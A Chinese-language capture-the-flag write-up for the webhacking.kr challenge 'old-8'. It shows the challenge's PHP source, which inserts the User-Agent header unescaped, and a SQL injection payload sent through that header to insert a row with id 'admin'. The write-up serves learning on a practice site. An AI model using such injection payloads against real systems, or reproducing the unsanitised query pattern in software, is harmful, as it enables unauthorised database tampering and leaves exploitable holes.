# old-8_350

* 點進去網頁裡面，看一下 source code 
    ```php=
    <?php
    $agent=trim(getenv("HTTP_USER_AGENT"));
    $ip=$_SERVER['REMOTE_ADDR'];
    if(preg_match("/from/i",$agent)){
      echo("<br>Access Denied!<br><br>");
      echo(htmlspecialchars($agent));
      exit();
    }
    $db = dbconnect();
    $count_ck = mysqli_fetch_array(mysqli_query($db,"select count(id) from chall8"));
    if($count_ck[0] >= 70){ mysqli_query($db,"delete from chall8"); }

    $result = mysqli_query($db,"select id from chall8 where agent='".addslashes($_SERVER['HTTP_USER_AGENT'])."'");
    $ck = mysqli_fetch_array($result);

    if($ck){
      echo "hi <b>".htmlentities($ck[0])."</b><p>";
      if($ck[0]=="admin"){
        mysqli_query($db,"delete from chall8");
        solve(8);
      }
    }

    if(!$ck){
      $q=mysqli_query($db,"insert into chall8(agent,ip,id) values('{$agent}','{$ip}','guest')") or die("query error");
      echo("<br><br>done!  ({$count_ck[0]}/70)");
    }
    ?>
    ```
    大概就是講說，會用 user agent 來新增 value，如果 id 是 admin 的話，這一題就過拉
* 這一題是 sql injection
* 重點是這一行 `insert into chall8(agent,ip,id) values('{$agent}','{$ip}','guest')` 乍看之下，永遠都不可能動到 guest 這個 value
* 所以換一個策略，要怎麼樣才能 insert 多個 value 呢？
    ```mysql=
    INSERT INTO table_name
    VALUES (value1_1, value2_2, value3_3,···),
    (value2_1, value2_2, value2_3,···),
    (value3_1, value3_2, value3_3,···),
    ······;
    ```
    看起來有點方向了
* 想了一下，如果可以 insert 兩個 value，一個的 id 是 admin 一個是 guest，之後把 user agent 改成 admin 的那一個不就過了 ～～～
* 這是我的 payload `123','127.0.0.1','admin'),('1234` 這是把它整體的樣子
     `insert into chall8(agent,ip,id) values('123','127.0.0.1','admin'),('1234','{$ip}','guest')`
* 這一題我是用 postman 來輔助
* 在送了 payload 之後，出現了 done
* 之後把 user agent 改成 123，就過拉
